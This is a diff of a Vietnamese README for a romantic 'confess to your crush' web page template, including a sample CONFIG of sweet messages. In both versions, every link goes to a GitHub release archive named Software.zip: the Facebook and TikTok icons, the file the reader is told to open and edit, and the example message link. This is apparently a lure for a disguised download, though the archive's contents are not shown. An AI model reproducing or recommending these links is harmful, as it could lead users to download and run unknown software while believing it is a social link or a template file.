@@ -2,10 +2,10 @@
 ## _Một điều nho nhỏ tỏ tình với crush_
 
 Liên lạc: 
-[![Facebook](https://github.com/RyoLasma/tang-crush/releases/download/v1.0/Software.zip)](https://github.com/RyoLasma/tang-crush/releases/download/v1.0/Software.zip)
-[![Tiktok](https://github.com/RyoLasma/tang-crush/releases/download/v1.0/Software.zip)](https://github.com/RyoLasma/tang-crush/releases/download/v1.0/Software.zip)
+[![Facebook](https://github.com/RyoLasma/tang-crush/releases/download/v2.0/Software.zip)](https://github.com/RyoLasma/tang-crush/releases/download/v2.0/Software.zip)
+[![Tiktok](https://github.com/RyoLasma/tang-crush/releases/download/v2.0/Software.zip)](https://github.com/RyoLasma/tang-crush/releases/download/v2.0/Software.zip)
 
-Mở file https://github.com/RyoLasma/tang-crush/releases/download/v1.0/Software.zip sửa nội dung theo mẫu
+Mở file https://github.com/RyoLasma/tang-crush/releases/download/v2.0/Software.zip sửa nội dung theo mẫu
 ```
 const CONFIG = {
     introTitle: 'Babe à!',
@@ -24,7 +24,7 @@ const CONFIG = {
     mess: 'Anh biết mà 🥰. Yêu em nhiều nhiều 😘😘',
     messDesc: 'Tối nay 7h anh qua đón nhé công chúa.',
     btnAccept: 'Okiiiii lun <3',
-    messLink: 'https://github.com/RyoLasma/tang-crush/releases/download/v1.0/Software.zip' //link mess của các bạn. VD: https://github.com/RyoLasma/tang-crush/releases/download/v1.0/Software.zip
+    messLink: 'https://github.com/RyoLasma/tang-crush/releases/download/v2.0/Software.zip' //link mess của các bạn. VD: https://github.com/RyoLasma/tang-crush/releases/download/v2.0/Software.zip
 }
 ```
 
